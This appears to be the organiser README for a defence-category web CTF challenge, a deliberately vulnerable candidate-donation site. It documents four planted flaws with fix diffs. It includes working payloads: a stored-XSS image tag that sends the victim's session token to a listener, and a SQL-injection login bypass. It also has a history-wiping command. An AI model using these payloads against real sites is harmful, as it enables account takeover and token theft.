# Candidate Registry

**Author:** trenth

**Category:** Defence - Web

## Description

The candidate registry is a site where candidates can post their platform, collect donations and answer questions asked by voters. You can refer to the [release readme](./release_files/README.md) for a more detailed description.

The code for the service was "vibe coded" using cursor, to attempt to replicate a codebase similar to what we will likely see more of in the coming years.

Overall the app uses:

- Golang (backend)
- Sqlite3 (database)
- Javascript (frontend)
- Docker compose (container orchestrator)


### Files

defence_private_key: a ssh private key which provides teams access to their machine

### Host

ssh vpcadmin@10.0.2.92

### CTFd Description

TODO

## Vulnerabilities


### V1 - Payments endpoint broken auth (allows any voter or candidate to view payments for any candidate)

[Update handlers.go](./release_files/backend/handlers/handlers.go)
```diff
func GetCandidatePayments(c *gin.Context) {
	// Get candidate ID from URL
	candidateID, err := strconv.Atoi(c.Param("id"))
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid candidate ID"})
		return
	}

+   // Get user ID from context
+	userID, exists := c.Get("user_id")
+	if !exists {
+		c.JSON(http.StatusUnauthorized, gin.H{"error": "User not authenticated"})
+		return
+	}

	// Verify the user is the candidate
	var count int
-	err = db.QueryRow("SELECT COUNT(*) FROM candidates WHERE id = ?", candidateID).Scan(&count)
+   err = db.QueryRow("SELECT COUNT(*) FROM candidates WHERE id = ? AND id = ?", candidateID, userID).Scan(&count)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to verify candidate"})
		log.Printf("Failed to verify candidate: %v", err)
		return
	}
```

---

### V2 - JWT insecure secret (the jwt secret hasn't been set so it's the default value)

[Update auth.go](./release_files/backend/auth/auth.go)
```diff
const (
    TokenExpiration = 24 * time.Hour
-   SecretKey      = "your-secret-key" // In production, use environment variable
+   SecretKey      = "some-random-new-secret-key-that-is-not-the-default" 
)
```

**Any requests working with generated JWT token means the exploit worked**

### V3 - XSS in voter questions (allows persistant XSS Injection)

Exploit:

> nc -nlvp 4444

```html
<img src="x" alt=" " onerror="fetch('http://localhost:4444/ping?c='+localStorage.getItem('token')).catch(()=>{})">
```

[Update Questions.js](./release_files/frontend/src/pages/questions/Questions.js)
```diff
    <Typography variant="body1" sx={{ mt: 1 }}>
-       Q: <span dangerouslySetInnerHTML={{ __html: question.question_text }} />
+       Q: <span>{question.question_text}</span>
    </Typography>

            <Typography variant="body1" color="primary">
-               A: <span dangerouslySetInnerHTML={{ __html: question.answer.answer_text }} />
+               A: <span>{question.answer.answer_text}</span>
            </Typography>
```

### V4 - SQL Injection in login endpoints (allows you to login as any user)

Exploit: 

```json
POST http://localhost:8080/auth/login/candidate
or
POST http://localhost:8080/auth/login/voter
{
    "email": "' UNION SELECT {id}, '{username}', '{useremail}', '$2y$10$mcxurRIhTcpboJEWtc0mmOY.RG38fh2jGTt47EZ.zwjGItJJpWqMG' --",
    "password": "hackedyou"
}
```

[Update handlers.go](./release_files/backend/handlers/handlers.go)
```diff
var voter models.Voter
var passwordHash string
-err := db.QueryRow("SELECT id, name, email, password_hash FROM voters WHERE email = '"+req.Email+"'").
+err := db.QueryRow("SELECT id, name, email, password_hash FROM voters WHERE email = ?", req.Email).
    Scan(&voter.ID, &voter.Name, &voter.Email, &passwordHash)
if err != nil {
    log.Printf("Failed to find voter: %v", err)
    c.JSON(http.StatusUnauthorized, gin.H{"error": "Invalid email or password"})
    return
}

var candidate models.Candidate
var passwordHash string
-err := db.QueryRow("SELECT id, name, email, password_hash FROM candidates WHERE email = '"+req.Email+"'").
+err := db.QueryRow("SELECT id, name, email, password_hash FROM candidates WHERE email = ?", req.Email).
    Scan(&candidate.ID, &candidate.Name, &candidate.Email, &passwordHash)
if err != nil {
    c.JSON(http.StatusUnauthorized, gin.H{"error": "Invalid email or password"})
    return
}

```

## Setup instructions

### Defence Box

Package up and copy the code onto the machine

> cd release_files/

> tar -cvf ../candy.tar .

> scp ../candy.tar vpcadmin@10.0.2.92:/home/vpcadmin/

Now we setup the machine

> ssh vpcadmin@10.0.2.92

> curl -fsSL https://get.docker.com -o install-docker.sh

> sh install-docker.sh --dry-run

> sh install-docker.sh

> rm install-docker.sh 

Reboot

> sudo reboot

Now run the service

> ssh vpcadmin@10.0.2.92

(And check that it comes up after a reboot)

Once it's ready for a snapshot use this to clear history and exit the sh

> cat /dev/null > ~/.bash_history && history -c && exit

### Attacker machine

1. Update the ATTACKER_IP in [candidate_attacker](./candidate_attacker.py) to match your attacker machine
2. scp candidate_attacker.py vpcadmin@{IP}:/home/vpcadmin/
3. scp requirements.txt vpcadmin@{IP}:/home/vpcadmin/
4. ssh vpcadmin@{IP}
5. Install python dependencies (pip3 install -r requirements)
6. playwright install (make sure its on path)


**Testing the attack script**

> PYTHONPATH=../siege python3 ../siege/siege/test_attacker.py candidate_attacker.py CandidateAttacker 10.0.2.92:80 1,2,3,4,-1,-2,-3,-4
